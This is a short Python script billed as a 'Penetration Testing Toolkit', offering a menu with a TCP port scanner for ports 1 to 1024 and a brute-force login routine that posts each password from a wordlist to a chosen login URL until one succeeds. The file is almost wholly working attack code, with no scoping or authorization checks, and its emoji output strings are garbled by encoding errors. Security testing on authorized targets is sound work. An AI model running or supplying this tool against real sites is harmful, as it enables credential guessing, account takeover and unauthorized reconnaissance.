import socket
import sys
import requests

def brute_force_login(url, username, password_list_file):
    print("\nüîê Starting Brute Force Attack...")
    try:
        with open(password_list_file, "r") as file:
            for password in file:
                password = password.strip()
                data = {
                    "username": username,
                    "password": password
                }
                response = requests.post(url, data=data)

                # Modify this condition based on your target site's response
                if "Invalid" not in response.text and response.status_code == 200:
                    print(f"‚úÖ Success! Password found: {password}")
                    return
                else:
                    print(f"‚ùå Tried: {password}")
        print("‚ö†Ô∏è Password not found in wordlist.")
    except FileNotFoundError:
        print("‚ùå Password list file not found.")
    except Exception as e:
        print(f"‚ùå Error: {e}")


# Function: Scan ports from 1 to 1024
def port_scanner(target):
    print(f"\nüîç Scanning ports on {target}...\n")
    try:
        for port in range(1, 1025):
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)  # short timeout for faster scan
            result = s.connect_ex((target, port))
            if result == 0:
                print(f"‚úÖ Port {port} is OPEN")
            s.close()
    except socket.gaierror:
        print("‚ùå Hostname could not be resolved.")
    except socket.error:
        print("‚ùå Could not connect to the server.")
    except KeyboardInterrupt:
        print("‚ùå Scan aborted by user.")
        sys.exit()

# Main menu
def main():
    while True:
        print("\nüõ°Ô∏è Penetration Testing Toolkit")
        print("1. Port Scanner")
        print("2. Brute Force Login")
        print("3. Exit")
        choice = input("Enter your choice: ")

        if choice == "1":
            target = input("Enter target IP or domain: ")
            port_scanner(target)
        elif choice == "2":
            url = input("Enter login URL (e.g., http://example.com/login): ")
            username = input("Enter username: ")
            wordlist = input("Enter path to password list file (e.g., credentials.txt): ")
            brute_force_login(url, username, wordlist)
        elif choice == "3":
            print("üëã Exiting...")
            break
        else:
            print("‚ùå Invalid choice. Try again.")

if __name__ == "__main__":
    main()
